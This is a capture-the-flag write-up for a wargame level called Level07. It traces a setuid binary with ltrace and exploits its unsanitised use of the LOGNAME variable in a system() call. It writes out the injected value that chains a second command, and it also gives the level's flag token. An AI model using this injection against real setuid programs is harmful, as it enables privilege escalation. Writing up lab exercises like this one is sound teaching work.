# Level07 Solution

## Steps:
1. Connected via SSH: `ssh level07@192.168.16.128 -p 4242`
2. Analyzed the binary `level07`:
   - It is a setuid binary owned by `flag07`.
   - Used `ltrace` to understand its behavior:
     ```bash
     ltrace ./level07
     ```
     Output:
     ```
     getenv("LOGNAME") = "level07"
     asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
     system("/bin/echo level07")
     ```
   - The binary retrieves the `LOGNAME` environment variable and uses it in a `system` call without sanitization.
3. Identified the vulnerability:
   - The `system` call is: `system("/bin/echo $LOGNAME")`
   - Since `LOGNAME` is user-controlled, we can inject commands.
4. Exploited via environment variable injection:
   - Set `LOGNAME` to a malicious value:
     ```bash
     export LOGNAME="; getflag #"
     ```
     - `;` ends the `echo` command and starts a new one.
     - `getflag` executes to print the token.
     - `#` comments out the rest of the command.
5. Ran the binary:
   - Command: `./level07`
   - Output: `Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`
6. Obtained the token: `fiumuikeil55xe9cu4dood66h`

## Notes:
- The binary is setuid and owned by `flag07`, so it runs with the privileges of `flag07`.
- The `system` function is called with a string built from the `LOGNAME` environment variable without sanitization.
- Command injection is possible using `;` to chain commands and `#` to comment out the rest.

## Tools used:
- `ltrace` (to trace library calls)
- `export` (to set environment variables)
- Command injection technique

## Vulnerability:
- Unsafe use of `system` with user-controlled environment variables.